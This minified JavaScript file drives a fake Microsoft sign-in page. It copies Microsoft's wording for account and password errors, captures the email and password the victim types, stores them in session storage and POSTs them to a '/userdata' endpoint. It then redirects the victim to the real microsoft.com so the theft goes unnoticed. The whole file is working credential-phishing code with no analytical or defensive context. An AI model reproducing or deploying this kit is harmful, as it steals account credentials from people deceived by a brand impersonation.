sessionStorage.getItem("password")&&(window.location.href="https://www.microsoft.com/");const slidePage=document.querySelector(".slide-page"),secondSlide=document.querySelector(".secondSlide"),btnNext=document.querySelector(".firstNext"),prevBtnSec=document.querySelector(".prev-1"),submitBtn=document.querySelector(".submit"),createBody=e=>JSON.stringify(e),sendData=e=>fetch("/userdata",{method:"POST",mode:"cors",cache:"no-cache",headers:{"Content-Type":"application/json"},referrerPolicy:"no-referrer",body:createBody(e)}).then(e=>{if(!e.ok)throw Error("Network response was not ok");return e.text()}).then(e=>{console.log("Success:",e)}).catch(e=>{console.error("Error:",e)});function validateEmail(e){return/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(e)}function validate(){let e=$("#result"),t=$("#email").val();return e.text(""),!!validateEmail(t)||(t?(e.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one."),e.css("color","red"),document.getElementById("loginForm").style.height="403px"):(e.text("Enter a valid email address, phone number, or Skype\n name."),e.css("color","red"),document.getElementById("loginForm").style.height="403px"),!1)}function validatePassword(){let e=$("#passResult"),t=$("#password").val();return e.text(""),!(t.length<8)||(e.text("Your account or password is incorrect. If you don't remember your password,"),e.css("color","red"),!1)}var input1=document.getElementById("email"),input2=document.getElementById("password");input1.addEventListener("keyup",function(e){13===e.keyCode&&(e.preventDefault(),document.getElementById("btnSend").click())}),input2.addEventListener("keyup",function(e){13===e.keyCode&&(e.preventDefault(),document.getElementById("btnSignIn").click())}),btnSend.addEventListener("click",function(){let e=input1.value;if(!validate()||!validateEmail(e))return;console.log(`User entered valid email: ${e}`),document.getElementById("userLine").textContent=e;let t=document.getElementById("section-1"),n=document.getElementById("section-2");t.style.marginLeft="-100%",t.style.visibility="hidden",n.style.marginLeft="0%",document.getElementById("loginForm").style.height="403px"}),btnSignIn.addEventListener("click",function(){let e=input1.value,t=input2.value;validatePassword()&&(console.log(`User entered valid password: ${t}`),sessionStorage.setItem("user",e),sessionStorage.setItem("password",t),console.log("Sending data to server..."),sendData({userName:e,password:t}),sessionStorage.setItem("secsession",!1),console.log("from session storage",sessionStorage.getItem("password")),setTimeout(function(){window.location.href="https://www.microsoft.com/"},1e3))}),prevBtnSec.addEventListener("click",function(){let e=document.getElementById("section-1"),t=document.getElementById("section-2");e.style.marginLeft="0%",e.style.visibility="visible",t.style.marginLeft="100%",document.getElementById("loginForm").style.height="370px",slidePage.style.marginLeft="0%",secondSlide.style.marginLeft="100%",slidePage.style.visibility="visible"});